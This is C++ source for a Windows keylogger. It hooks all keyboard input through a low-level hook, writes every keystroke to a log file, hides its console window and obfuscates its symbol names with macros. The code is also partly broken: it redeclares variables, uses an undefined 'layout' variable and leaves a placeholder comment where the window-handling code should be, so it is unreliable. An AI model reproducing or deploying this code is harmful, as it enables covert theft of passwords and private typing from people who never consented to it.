#ifndef UNICODE
#define UNICODE
#endif

#include <iostream>
#include <map>
#include <Windows.h>
#include <fstream>
#include <sstream>
#include <time.h>

#define CONCAT(a, b) a##b
#define EXPAND(a, b) CONCAT(a, b)
#define OBFSYM(a, b) EXPAND(a, EXPAND(_, b))

#define HOOKSYM OBFSYM(_, OBFSYM(_, hook))
#define KBDSTRUCTSYM OBFSYM(_, OBFSYM(_, kbdStruct))
#define KEYSTROKESYM OBFSYM(_, OBFSYM(_, keyStroke))
#define OUTPUTSYM OBFSYM(_, OBFSYM(_, output))

#if EXPAND(O, F) == 0
const std::map<int, std::string> OBFSYM(keyname, _) = {
        {EXPAND(VK, BACK), "[BACKSPACE]"},
        {EXPAND(VK, RETURN), "\n"},
        {EXPAND(VK, SPACE), "_"},
        {EXPAND(VK, TAB), "[TAB]"},
        {EXPAND(VK, SHIFT), "[SHIFT]"},
        {EXPAND(VK, LSHIFT), "[LSHIFT]"},
        {EXPAND(VK, RSHIFT), "[RSHIFT]"},
        {EXPAND(VK, CONTROL), "[CONTROL]"},
        {EXPAND(VK, LCONTROL), "[LCONTROL]"},
        {EXPAND(VK, RCONTROL), "[RCONTROL]"},
        {EXPAND(VK, MENU), "[ALT]"},
        {EXPAND(VK, LWIN), "[LWIN]"},
        {EXPAND(VK, RWIN), "[RWIN]"},
        {EXPAND(VK, ESCAPE), "[ESCAPE]"},
        {EXPAND(VK, END), "[END]"},
        {EXPAND(VK, HOME), "[HOME]"},
        {EXPAND(VK, LEFT), "[LEFT]"},
        {EXPAND(VK, RIGHT), "[RIGHT]"},
        {EXPAND(VK, UP), "[UP]"},
        {EXPAND(VK, DOWN), "[DOWN]"},
        {EXPAND(VK, PRIOR), "[PG_UP]"},
        {EXPAND(VK, NEXT), "[PG_DOWN]"},
        {EXPAND(VK, OEM_PERIOD), "."},
        {EXPAND(VK, DECIMAL), "."},
        {EXPAND(VK, OEM_PLUS), "+"},
        {EXPAND(VK, OEM_MINUS), "-"},
        {EXPAND(VK, ADD), "+"},
        {EXPAND(VK, SUBTRACT), "-"},
        {EXPAND(VK, CAPITAL), "[CAPSLOCK]"},
};
#endif

HHOOK HOOKSYM;
KBDLLHOOKSTRUCT KBDSTRUCTSYM;

int OUTPUTSYM(int KEYSTROKESYM);
std::ofstream OUTPUTSYM_FILE;

LRESULT __stdcall OBFSYM(hookCallback, _)(int _nCode, WPARAM _wParam, LPARAM _lParam)
{
    if (_nCode >= 0)
    {
        if (_wParam == WM_KEYDOWN)
        {
            KBDSTRUCTSYM = *reinterpret_cast<KBDLLHOOKSTRUCT*>(_lParam);
            OUTPUTSYM(KBDSTRUCTSYM.vkCode);
        }
    }
    return CallNextHookEx(HOOKSYM, _nCode, _wParam, _lParam);
}

void OBFSYM(setHook, _)()
{
    if (!(HOOKSYM = SetWindowsHookEx(WH_KEYBOARD_LL, OBFSYM(hookCallback, _), NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void OBFSYM(releaseHook, _)()
{
    UnhookWindowsHookEx(HOOKSYM);
}

int OUTPUTSYM(int KEYSTROKESYM)
{
    std::stringstream OUTPUTSYM;
    static char OBFSYM(lastWindow, _)[256] = "";

    std::stringstream OUTPUTSYM;
    static char OBFSYM(lastWindow, _)[256] = "";

#ifndef _MOUSEIGNORE
    if ((KEYSTROKESYM == 1) || (KEYSTROKESYM == 2))
    {
        return 0; // ignore mouse clicks
    }
#endif

    // ... Rest of the window handling code ...

#if EXPAND(O, F) == 10
    OUTPUTSYM << "[" << KEYSTROKESYM << "]";
#elif EXPAND(O, F) == 16
    OUTPUTSYM << std::hex << "[" << KEYSTROKESYM << "]";
#else
    if (OBFSYM(keyname, _).find(KEYSTROKESYM) != OBFSYM(keyname, _).end())
    {
        OUTPUTSYM << OBFSYM(keyname, _).at(KEYSTROKESYM);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        key = MapVirtualKeyExA(KEYSTROKESYM, MAPVK_VK_TO_CHAR, layout);

        if (!lowercase)
        {
            key = tolower(key);
        }
        OUTPUTSYM << char(key);
    }
#endif

    OUTPUTSYM_FILE << OUTPUTSYM.str();
    OUTPUTSYM_FILE.flush();

    std::cout << OUTPUTSYM.str();

    return 0;
}

void OBFSYM(stealth, _)()
{
#ifdef OBFSYM(VISIBLE, _)
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef OBFSYM(INVISIBLE, _)
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
#endif
}

int main()
{
    const char* OUTPUTFILENAME = "keylogger.log";
    std::cout << "Logging output to " << OUTPUTFILENAME << std::endl;
    OUTPUTSYM_FILE.open(OUTPUTFILENAME, std::ios_base::app);

    OBFSYM(stealth, _)();

    OBFSYM(setHook, _)();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}
